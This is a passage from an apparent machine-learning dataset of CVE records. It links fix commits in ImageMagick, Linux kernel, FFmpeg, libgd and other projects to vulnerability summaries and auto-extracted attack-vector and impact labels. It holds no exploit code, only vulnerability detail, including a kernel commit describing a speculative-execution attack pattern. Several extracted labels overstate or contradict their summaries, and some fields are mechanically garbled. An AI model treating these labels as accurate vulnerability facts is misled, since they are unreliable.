Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"025e77fcb2f45b21689931ba3bf74eac153afa48","cve_id":"CVE-2019-13307","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1615","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore\/statistic.c in EvaluateImages because of mishandling rows.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer overflow at magickcore \/ statistic . c","Attack Type":"remote attacker"},{"commit_id":"e92040ea6ee2a844ebfd2344174076795a4787bd","cve_id":"CVE-2019-13306","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1612","summary":"ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders\/pnm.c in WritePNMImage because of off-by-one errors.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer overflow at coders \/ pnm . c","Attack Type":"remote attacker"},{"commit_id":"29efd648f38b73a64d73f14cd2019d869a585888","cve_id":"CVE-2019-13305","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1613","summary":"ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders\/pnm.c in WritePNMImage because of a misplaced strncpy and an off-by-one error.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer overflow at coders \/ pnm . c","Attack Type":"remote attacker"},{"commit_id":"bfa3b9610c83227894c92b0d312ad327fceb6241","cve_id":"CVE-2019-13304","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1614","summary":"ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders\/pnm.c in WritePNMImage because of a misplaced assignment.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer overflow at coders \/ pnm . c","Attack Type":"remote attacker"},{"commit_id":"a906fe9298bf89e01d5272023db687935068849a","cve_id":"CVE-2019-13300","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1586","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore\/statistic.c in EvaluateImages because of mishandling columns.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow at magickcore \/ statistic . c","Attack Type":"local attacker"},{"commit_id":"604588fc35c7585abb7a9e71f69bb82e4389fefc","cve_id":"CVE-2019-13297","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1609","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read at MagickCore\/threshold.c in AdaptiveThresholdImage because a height of zero is mishandled.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by AdaptiveThresholdImage","Attack Type":"local attacker"},{"commit_id":"55e6dc49f1a381d9d511ee2f888fdc3e3c3e3953","cve_id":"CVE-2019-13295","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1608","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read at MagickCore\/threshold.c in AdaptiveThresholdImage because a width of zero is mishandled.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by AdaptiveThresholdImage","Attack Type":"local attacker"},{"commit_id":"35ccb468ee2dcbe8ce9cf1e2f1957acc27f54c34","cve_id":"CVE-2019-13137","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1601","summary":"ImageMagick before 7.0.8-50 has a memory leak vulnerability in the function ReadPSImage in coders\/ps.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"1e59b29e520d2beab73e8c78aacd5f1c0d76196d","cve_id":"CVE-2019-13135","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1599","summary":"ImageMagick before 7.0.8-50 has a *use of uninitialized value* vulnerability in the function ReadCUTImage in coders\/cut.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by an uninitialized value vulnerability","Attack Type":"remote attacker"},{"commit_id":"daedbbb5541cd8ecda1459d3b843ea4d92788762","cve_id":"CVE-2019-12904","cwe_id":"CWE-310","commit_message":"AES: move look-up tables to .data section and unshare between processes\n\n* cipher\/rijndael-internal.h (ATTR_ALIGNED_64): New.\n* cipher\/rijndael-tables.h (encT): Move to 'enc_tables' structure.\n(enc_tables): New structure for encryption table with counters before\nand after.\n(encT): New macro.\n(dec_tables): Add counters before and after encryption table; Move\nfrom .rodata to .data section.\n(do_encrypt): Change 'encT' to 'enc_tables.T'.\n(do_decrypt): Change '&dec_tables' to 'dec_tables.T'.\n* cipher\/cipher-gcm.c (prefetch_table): Make inline; Handle input\nwith length not multiple of 256.\n(prefetch_enc, prefetch_dec): Modify pre- and post-table counters\nto unshare look-up table pages between processes.\n--\n\nGnuPG-bug-id: 4541\nSigned-off-by: Jussi Kivilinna <jussi.kivilinna@iki.fi>","summary":"In Libgcrypt 1.8.4, the C implementation of AES is vulnerable to a flush-and-reload side-channel attack because physical addresses are available to other processes. (The C implementation is used on platforms where an assembly-language implementation is unavailable.)","commit_message_1":"move look-up table to","Vulnerability Type":"Cryptographic Issues","Attack Vector":"By using a flush-and-reload side-channel attack","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"86030db849260dd8fb2ed975b9890aef1b62b692","cve_id":"CVE-2019-12109","cwe_id":"CWE-476","commit_message":"fix error from commit 13585f15c7f7dc28bbbba1661efb280d530d114c","summary":"A Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in GetOutboundPinholeTimeout in upnpsoap.c for rem_port.","commit_message_1":"fix error from commit 13585f15c7f7dc28bbbba1661efb280d530d114c","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially crafted request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"3eaddb33619eaaf74a760872850c550ad8f5c52f","cve_id":"CVE-2019-11924","cwe_id":"CWE-400","commit_message":"Coalesce handshake buffers\n\nSummary:\nIt is possible that a peer might send us records in a manner such\nthat there is a 16KB record and only 1 byte of handshake message in\neach record. Since we normally just trim the IOBuf, we would end up\nholding 16K of data per actual byte of data. To prevent this we allocate a contiguous\nbuffer to copy over these bytes for handshake messages for now.\n\nThis is a partial fix for CVE-2019-11924\n\nReviewed By: ngoyal\n\nDifferential Revision: D16478044\n\nfbshipit-source-id: 464bc68eaefda065d9a327818100427377293fbd","summary":"A peer could send empty handshake fragments containing only padding which would be kept in memory until a full handshake was received, resulting in memory exhaustion. This issue affects versions v2019.01.28.00 and above of fizz, until v2019.08.05.00.","commit_message_1":"it is possible that a peer might send u record in a manner such that there is a 16kb record and only <number> byte of handshake message in each record","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By sending empty handshake fragments containing only padding","Impact":"cause a denial of service","Root Cause":"caused by improper input validation","Attack Type":"remote attacker"},{"commit_id":"6b3a707736301c2128ca85ce85fb13f60b5e350a","cve_id":"CVE-2019-11487","cwe_id":"CWE-416","commit_message":"Merge branch 'page-refs' (page ref overflow)\n\nMerge page ref overflow branch.\n\nJann Horn reported that he can overflow the page ref count with\nsufficient memory (and a filesystem that is intentionally extremely\nslow).\n\nAdmittedly it's not exactly easy.  To have more than four billion\nreferences to a page requires a minimum of 32GB of kernel memory just\nfor the pointers to the pages, much less any metadata to keep track of\nthose pointers.  Jann needed a total of 140GB of memory and a specially\ncrafted filesystem that leaves all reads pending (in order to not ever\nfree the page references and just keep adding more).\n\nStill, we have a fairly straightforward way to limit the two obvious\nuser-controllable sources of page references: direct-IO like page\nreferences gotten through get_user_pages(), and the splice pipe page\nduplication.  So let's just do that.\n\n* branch page-refs:\n  fs: prevent page refcount overflow in pipe_buf_get\n  mm: prevent get_user_pages() from overflowing page refcount\n  mm: add 'try_get_page()' helper function\n  mm: make page ref count overflow check tighter and more explicit","summary":"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs\/fuse\/dev.c, fs\/pipe.c, fs\/splice.c, include\/linux\/mm.h, include\/linux\/pipe_fs_i.h, kernel\/trace\/trace.c, mm\/gup.c, and mm\/hugetlb.c. It can occur with FUSE requests.","commit_message_1":"merge branch 'page-refs ' ( page ref overflow ) merge page ref overflow branch","Vulnerability Type":"Use After Free","Attack Vector":"using FUSE with ~140GiB RAM usage","Impact":"cause a denial of service","Root Cause":"caused by a page->_refcount overflow","Attack Type":"local attacker"},{"commit_id":"88b1a17dfc3ed7728316478fae0f5ad508f50397","cve_id":"CVE-2019-11487","cwe_id":"CWE-416","commit_message":"mm: add 'try_get_page()' helper function\n\nThis is the same as the traditional 'get_page()' function, but instead\nof unconditionally incrementing the reference count of the page, it only\ndoes so if the count was \"safe\".  It returns whether the reference count\nwas incremented (and is marked __must_check, since the caller obviously\nhas to be aware of it).\n\nAlso like 'get_page()', you can't use this function unless you already\nhad a reference to the page.  The intent is that you can use this\nexactly like get_page(), but in situations where you want to limit the\nmaximum reference count.\n\nThe code currently does an unconditional WARN_ON_ONCE() if we ever hit\nthe reference count issues (either zero or negative), as a notification\nthat the conditional non-increment actually happened.\n\nNOTE! The count access for the \"safety\" check is inherently racy, but\nthat doesn't matter since the buffer we use is basically half the range\nof the reference count (ie we look at the sign of the count).\n\nAcked-by: Matthew Wilcox <willy@infradead.org>\nCc: Jann Horn <jannh@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs\/fuse\/dev.c, fs\/pipe.c, fs\/splice.c, include\/linux\/mm.h, include\/linux\/pipe_fs_i.h, kernel\/trace\/trace.c, mm\/gup.c, and mm\/hugetlb.c. It can occur with FUSE requests.","commit_message_1":"add 'try_get_page ( ) ' helper function this is the same a the traditional 'get_page ( ) ' function , but instead of unconditionally incrementing the reference count of the page , it only doe so if the count wa `` safe ''","Vulnerability Type":"Use After Free","Attack Vector":"using FUSE with ~140GiB RAM usage","Impact":"cause a denial of service","Root Cause":"caused by a page->_refcount overflow","Attack Type":"local attacker"},{"commit_id":"8fde12ca79aff9b5ba951fce1a2641901b8d8e64","cve_id":"CVE-2019-11487","cwe_id":"CWE-416","commit_message":"mm: prevent get_user_pages() from overflowing page refcount\n\nIf the page refcount wraps around past zero, it will be freed while\nthere are still four billion references to it.  One of the possible\navenues for an attacker to try to make this happen is by doing direct IO\non a page multiple times.  This patch makes get_user_pages() refuse to\ntake a new page reference if there are already more than two billion\nreferences to the page.\n\nReported-by: Jann Horn <jannh@google.com>\nAcked-by: Matthew Wilcox <willy@infradead.org>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs\/fuse\/dev.c, fs\/pipe.c, fs\/splice.c, include\/linux\/mm.h, include\/linux\/pipe_fs_i.h, kernel\/trace\/trace.c, mm\/gup.c, and mm\/hugetlb.c. It can occur with FUSE requests.","commit_message_1":"prevent get_user_pages ( ) from overflowing page refcount if the page refcount wrap around past zero , it will be freed while there are still four billion reference to it","Vulnerability Type":"Use After Free","Attack Vector":"using FUSE with ~140GiB RAM usage","Impact":"cause a denial of service","Root Cause":"caused by a page->_refcount overflow","Attack Type":"local attacker"},{"commit_id":"15fab63e1e57be9fdb5eec1bbc5916e9825e9acb","cve_id":"CVE-2019-11487","cwe_id":"CWE-416","commit_message":"fs: prevent page refcount overflow in pipe_buf_get\n\nChange pipe_buf_get() to return a bool indicating whether it succeeded\nin raising the refcount of the page (if the thing in the pipe is a page).\nThis removes another mechanism for overflowing the page refcount.  All\ncallers converted to handle a failure.\n\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Matthew Wilcox <willy@infradead.org>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs\/fuse\/dev.c, fs\/pipe.c, fs\/splice.c, include\/linux\/mm.h, include\/linux\/pipe_fs_i.h, kernel\/trace\/trace.c, mm\/gup.c, and mm\/hugetlb.c. It can occur with FUSE requests.","commit_message_1":"prevent page refcount overflow in pipe_buf_get change pipe_buf_get ( ) to return a bool indicating whether it succeeded in raising the refcount of the page ( if the thing in the pipe is a page )","Vulnerability Type":"Use After Free","Attack Vector":"using FUSE with ~140GiB RAM usage","Impact":"cause a denial of service","Root Cause":"caused by a page->_refcount overflow","Attack Type":"local attacker"},{"commit_id":"1f686d023b95219db933394a7704ad9aa5f01cbb","cve_id":"CVE-2019-11339","cwe_id":"CWE-125","commit_message":"avcodec\/mpeg4videodec: Clear interlaced_dct for studio profile\n\nFixes: Out of array access\nFixes: 13090\/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_MPEG4_fuzzer-5408668986638336\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/projects\/ffmpeg\nReviewed-by: Kieran Kunhya <kierank@obe.tv>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The studio profile decoder in libavcodec\/mpeg4videodec.c in FFmpeg 4.0 before 4.0.4 and 4.1 before 4.1.2 allows remote attackers to cause a denial of service (out-of-array access) or possibly have unspecified other impact via crafted MPEG-4 video data.","commit_message_1":"avcodec\/mpeg4videodec : clear interlaced_dct for studio profile","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted mpeg - 4 video data","Impact":"cause a denial of service ( out - of - array access ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-arrary access flaw","Attack Type":"remote attacker"},{"commit_id":"55f0fc7a02de8f12757f4937143d8d5091b2e40b","cve_id":"CVE-2019-10638","cwe_id":"CWE-200","commit_message":"inet: update the IP ID generation algorithm to higher standards.\n\nCommit 355b98553789 (\"netns: provide pure entropy for net_hash_mix()\")\nmakes net_hash_mix() return a true 32 bits of entropy.  When used in the\nIP ID generation algorithm, this has the effect of extending the IP ID\ngeneration key from 32 bits to 64 bits.\n\nHowever, net_hash_mix() is only used for IP ID generation starting with\nkernel version 4.1.  Therefore, earlier kernels remain with 32-bit key\nno matter what the net_hash_mix() return value is.\n\nThis change addresses the issue by explicitly extending the key to 64\nbits for kernels older than 4.1.\n\nSigned-off-by: Amit Klein <aksecurity@gmail.com>\nCc: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"In the Linux kernel before 5.1.7, a device can be tracked by an attacker using the IP ID values the kernel produces for connection-less protocols (e.g., UDP and ICMP). When such traffic is sent to multiple destination IP addresses, it is possible to obtain hash collisions (of indices to the counter array) and thereby obtain the hashing key (via enumeration). An attack may be conducted by hosting a crafted web page that uses WebRTC or gQUIC to force UDP traffic to attacker-controlled IP addresses.","commit_message_1":"update the ip id generation algorithm to higher standard","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By persuading a victim to visit a specially crafted Web site","Impact":"obtain sensitive information","Root Cause":"caused by the use of IP ID values for connection-less protocols","Attack Type":"remote attacker"},{"commit_id":"979d63d50c0c0f7bc537bf821e056cc9fe5abd38","cve_id":"CVE-2019-7308","cwe_id":"CWE-189","commit_message":"bpf: prevent out of bounds speculation on pointer arithmetic\n\nJann reported that the original commit back in b2157399cc98\n(\"bpf: prevent out-of-bounds speculation\") was not sufficient\nto stop CPU from speculating out of bounds memory access:\nWhile b2157399cc98 only focussed on masking array map access\nfor unprivileged users for tail calls and data access such\nthat the user provided index gets sanitized from BPF program\nand syscall side, there is still a more generic form affected\nfrom BPF programs that applies to most maps that hold user\ndata in relation to dynamic map access when dealing with\nunknown scalars or \"slow\" known scalars as access offset, for\nexample:\n\n  - Load a map value pointer into R6\n  - Load an index into R7\n  - Do a slow computation (e.g. with a memory dependency) that\n    loads a limit into R8 (e.g. load the limit from a map for\n    high latency, then mask it to make the verifier happy)\n  - Exit if R7 >= R8 (mispredicted branch)\n  - Load R0 = R6[R7]\n  - Load R0 = R6[R0]\n\nFor unknown scalars there are two options in the BPF verifier\nwhere we could derive knowledge from in order to guarantee\nsafe access to the memory: i) While <\/>\/<=\/>= variants won't\nallow to derive any lower or upper bounds from the unknown\nscalar where it would be safe to add it to the map value\npointer, it is possible through ==\/!= test however. ii) another\noption is to transform the unknown scalar into a known scalar,\nfor example, through ALU ops combination such as R &= <imm>\nfollowed by R |= <imm> or any similar combination where the\noriginal information from the unknown scalar would be destroyed\nentirely leaving R with a constant. The initial slow load still\nprecedes the latter ALU ops on that register, so the CPU\nexecutes speculatively from that point. Once we have the known\nscalar, any compare operation would work then. A third option\nonly involving registers with known scalars could be crafted\nas described in [0] where a CPU port (e.g. Slow Int unit)\nwould be filled with many dependent computations such that\nthe subsequent condition depending on its outcome has to wait\nfor evaluation on its execution port and thereby executing\nspeculatively if the speculated code can be scheduled on a\ndifferent execution port, or any other form of mistraining\nas described in [1], for example. Given this is not limited\nto only unknown scalars, not only map but also stack access\nis affected since both is accessible for unprivileged users\nand could potentially be used for out of bounds access under\nspeculation.\n\nIn order to prevent any of these cases, the verifier is now\nsanitizing pointer arithmetic on the offset such that any\nout of bounds speculation would be masked in a way where the\npointer arithmetic result in the destination register will\nstay unchanged, meaning offset masked into zero similar as\nin array_index_nospec() case. With regards to implementation,\nthere are three options that were considered: i) new insn\nfor sanitation, ii) push\/pop insn and sanitation as inlined\nBPF, iii) reuse of ax register and sanitation as inlined BPF.\n\nOption i) has the downside that we end up using from reserved\nbits in the opcode space, but also that we would require\neach JIT to emit masking as native arch opcodes meaning\nmitigation would have slow adoption till everyone implements\nit eventually which is counter-productive. Option ii) and iii)\nhave both in common that a temporary register is needed in\norder to implement the sanitation as inlined BPF since we\nare not allowed to modify the source register. While a push \/\npop insn in ii) would be useful to have in any case, it\nrequires once again that every JIT needs to implement it\nfirst. While possible, amount of changes needed would also\nbe unsuitable for a -stable patch. Therefore, the path which\nhas fewer changes, less BPF instructions for the mitigation\nand does not require anything to be changed in the JITs is\noption iii) which this work is pursuing. The ax register is\nalready mapped to a register in all JITs (modulo arm32 where\nit's mapped to stack as various other BPF registers there)\nand used in constant blinding for JITs-only so far. It can\nbe reused for verifier rewrites under certain constraints.\nThe interpreter's tmp \"register\" has therefore been remapped\ninto extending the register set with hidden ax register and\nreusing that for a number of instructions that needed the\nprior temporary variable internally (e.g. div, mod). This\nallows for zero increase in stack space usage in the interpreter,\nand enables (restricted) generic use in rewrites otherwise as\nlong as such a patchlet does not make use of these instructions.\nThe sanitation mask is dynamic and relative to the offset the\nmap value or stack pointer currently holds.\n\nThere are various cases that need to be taken under consideration\nfor the masking, e.g. such operation could look as follows:\nptr += val or val += ptr or ptr -= val. Thus, the value to be\nsanitized could reside either in source or in destination\nregister, and the limit is different depending on whether\nthe ALU op is addition or subtraction and depending on the\ncurrent known and bounded offset. The limit is derived as\nfollows: limit := max_value_size - (smin_value + off). For\nsubtraction: limit := umax_value + off. This holds because\nwe do not allow any pointer arithmetic that would\ntemporarily go out of bounds or would have an unknown\nvalue with mixed signed bounds where it is unclear at\nverification time whether the actual runtime value would\nbe either negative or positive. For example, we have a\nderived map pointer value with constant offset and bounded\none, so limit based on smin_value works because the verifier\nrequires that statically analyzed arithmetic on the pointer\nmust be in bounds, and thus it checks if resulting\nsmin_value + off and umax_value + off is still within map\nvalue bounds at time of arithmetic in addition to time of\naccess. Similarly, for the case of stack access we derive\nthe limit as follows: MAX_BPF_STACK + off for subtraction\nand -off for the case of addition where off := ptr_reg->off +\nptr_reg->var_off.value. Subtraction is a special case for\nthe masking which can be in form of ptr += -val, ptr -= -val,\nor ptr -= val. In the first two cases where we know that\nthe value is negative, we need to temporarily negate the\nvalue in order to do the sanitation on a positive value\nwhere we later swap the ALU op, and restore original source\nregister if the value was in source.\n\nThe sanitation of pointer arithmetic alone is still not fully\nsufficient as is, since a scenario like the following could\nhappen ...\n\n  PTR += 0x1000 (e.g. K-based imm)\n  PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON\n  PTR += 0x1000\n  PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON\n  [...]\n\n... which under speculation could end up as ...\n\n  PTR += 0x1000\n  PTR -= 0 [ truncated by mitigation ]\n  PTR += 0x1000\n  PTR -= 0 [ truncated by mitigation ]\n  [...]\n\n... and therefore still access out of bounds. To prevent such\ncase, the verifier is also analyzing safety for potential out\nof bounds access under speculative execution. Meaning, it is\nalso simulating pointer access under truncation. We therefore\n\"branch off\" and push the current verification state after the\nALU operation with known 0 to the verification stack for later\nanalysis. Given the current path analysis succeeded it is\nlikely that the one under speculation can be pruned. In any\ncase, it is also subject to existing complexity limits and\ntherefore anything beyond this point will be rejected. In\nterms of pruning, it needs to be ensured that the verification\nstate from speculative execution simulation must never prune\na non-speculative execution path, therefore, we mark verifier\nstate accordingly at the time of push_stack(). If verifier\ndetects out of bounds access under speculative execution from\none of the possible paths that includes a truncation, it will\nreject such program.\n\nGiven we mask every reg-based pointer arithmetic for\nunprivileged programs, we've been looking into how it could\naffect real-world programs in terms of size increase. As the\nmajority of programs are targeted for privileged-only use\ncase, we've unconditionally enabled masking (with its alu\nrestrictions on top of it) for privileged programs for the\nsake of testing in order to check i) whether they get rejected\nin its current form, and ii) by how much the number of\ninstructions and size will increase. We've tested this by\nusing Katran, Cilium and test_l4lb from the kernel selftests.\nFor Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o\nand an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb\nwe've used test_l4lb.o as well as test_l4lb_noinline.o. We\nfound that none of the programs got rejected by the verifier\nwith this change, and that impact is rather minimal to none.\nbalancer_kern.o had 13,904 bytes (1,738 insns) xlated and\n7,797 bytes JITed before and after the change. Most complex\nprogram in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated\nand 18,538 bytes JITed before and after and none of the other\ntail call programs in bpf_lxc.o had any changes either. For\nthe older bpf_lxc_opt_-DUNKNOWN.o object we found a small\nincrease from 20,616 bytes (2,576 insns) and 12,536 bytes JITed\nbefore to 20,664 bytes (2,582 insns) and 12,558 bytes JITed\nafter the change. Other programs from that object file had\nsimilar small increase. Both test_l4lb.o had no change and\nremained at 6,544 bytes (817 insns) xlated and 3,401 bytes\nJITed and for test_l4lb_noinline.o constant at 5,080 bytes\n(634 insns) xlated and 3,313 bytes JITed. This can be explained\nin that LLVM typically optimizes stack based pointer arithmetic\nby using K-based operations and that use of dynamic map access\nis not overly frequent. However, in future we may decide to\noptimize the algorithm further under known guarantees from\nbranch and value speculation. Latter seems also unclear in\nterms of prediction heuristics that today's CPUs apply as well\nas whether there could be collisions in e.g. the predictor's\nValue History\/Pattern Table for triggering out of bounds access,\nthus masking is performed unconditionally at this point but could\nbe subject to relaxation later on. We were generally also\nbrainstorming various other approaches for mitigation, but the\nblocker was always lack of available registers at runtime and\/or\noverhead for runtime tracking of limits belonging to a specific\npointer. Thus, we found this to be minimally intrusive under\ngiven constraints.\n\nWith that in place, a simple example with sanitized access on\nunprivileged load at post-verification time looks as follows:\n\n  # bpftool prog dump xlated id 282\n  [...]\n  28: (79) r1 = *(u64 *)(r7 +0)\n  29: (79) r2 = *(u64 *)(r7 +8)\n  30: (57) r1 &= 15\n  31: (79) r3 = *(u64 *)(r0 +4608)\n  32: (57) r3 &= 1\n  33: (47) r3 |= 1\n  34: (2d) if r2 > r3 goto pc+19\n  35: (b4) (u32) r11 = (u32) 20479  |\n  36: (1f) r11 -= r2                | Dynamic sanitation for pointer\n  37: (4f) r11 |= r2                | arithmetic with registers\n  38: (87) r11 = -r11               | containing bounded or known\n  39: (c7) r11 s>>= 63              | scalars in order to prevent\n  40: (5f) r11 &= r2                | out of bounds speculation.\n  41: (0f) r4 += r11                |\n  42: (71) r4 = *(u8 *)(r4 +0)\n  43: (6f) r4 <<= r1\n  [...]\n\nFor the case where the scalar sits in the destination register\nas opposed to the source register, the following code is emitted\nfor the above example:\n\n  [...]\n  16: (b4) (u32) r11 = (u32) 20479\n  17: (1f) r11 -= r2\n  18: (4f) r11 |= r2\n  19: (87) r11 = -r11\n  20: (c7) r11 s>>= 63\n  21: (5f) r2 &= r11\n  22: (0f) r2 += r0\n  23: (61) r0 = *(u32 *)(r2 +0)\n  [...]\n\nJIT blinding example with non-conflicting use of r10:\n\n  [...]\n   d5:\tje     0x0000000000000106    _\n   d7:\tmov    0x0(%rax),%edi       |\n   da:\tmov    $0xf153246,%r10d     | Index load from map value and\n   e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.\n   e7:\tand    %r10,%rdi            |_\n   ea:\tmov    $0x2f,%r10d          |\n   f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10\n   f3:\tor     %rdi,%r10            | but do not interfere with each\n   f6:\tneg    %r10                 | other. (Neither do these instructions\n   f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp\n   fd:\tand    %r10,%rdi            | in interpreter.)\n  100:\tadd    %rax,%rdi            |_\n  103:\tmov    0x0(%rdi),%eax\n [...]\n\nTested that it fixes Jann's reproducer, and also checked that test_verifier\nand test_progs suite with interpreter, JIT and JIT with hardening enabled\non x86-64 and arm64 runs successfully.\n\n  [0] Speculose: Analyzing the Security Implications of Speculative\n      Execution in CPUs, Giorgi Maisuradze and Christian Rossow,\n      https:\/\/arxiv.org\/pdf\/1801.04084.pdf\n\n  [1] A Systematic Evaluation of Transient Execution Attacks and\n      Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,\n      Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,\n      Dmitry Evtyushkin, Daniel Gruss,\n      https:\/\/arxiv.org\/pdf\/1811.05441.pdf\n\nFixes: b2157399cc98 (\"bpf: prevent out-of-bounds speculation\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>","summary":"kernel\/bpf\/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.","commit_message_1":"prevent out of bound speculation on pointer arithmetic jann reported that the original commit back in b2157399cc98 ( `` bpf : prevent out-of-bounds speculation '' ) wa not sufficient to stop cpu from speculating out of bound memory access : while b2157399cc98 only focussed on masking array map access for unprivileged user for tail call and data access such that the user provided index get sanitized from bpf program and syscall side , there is still a more generic form affected from bpf program that applies to most map that hold user data in relation to dynamic map access when dealing with unknown scalar or `` slow '' known scalar a access offset , for example : - load a map value pointer into r6 - load an index into r7 - do a slow computation ( <file>","Vulnerability Type":"Numeric Errors","Attack Vector":"cases of different branches with different state or limits to sanitize","Impact":"bypass security restrictions","Root Cause":"caused by an out-of-bounds access speculation on pointer arithmetic","Attack Type":"local attacker"},{"commit_id":"553702980ae89c83f2d6e254d62cf82e204956d0","cve_id":"CVE-2019-6978","cwe_id":"CWE-415","commit_message":"Fix #492: Potential double-free in gdImage*Ptr()\n\nWhenever `gdImage*Ptr()` calls `gdImage*Ctx()` and the latter fails, we\nmust not call `gdDPExtractData()`; otherwise a double-free would\nhappen.  Since `gdImage*Ctx()` are void functions, and we can't change\nthat for BC reasons, we're introducing static helpers which are used\ninternally.\n\nWe're adding a regression test for `gdImageJpegPtr()`, but not for\n`gdImageGifPtr()` and `gdImageWbmpPtr()` since we don't know how to\ntrigger failure of the respective `gdImage*Ctx()` calls.\n\nThis potential security issue has been reported by Solmaz Salimi (aka.\nRooney).","summary":"The GD Graphics Library (aka LibGD) 2.2.5 has a double free in the gdImage*Ptr() functions in gd_gif_out.c, 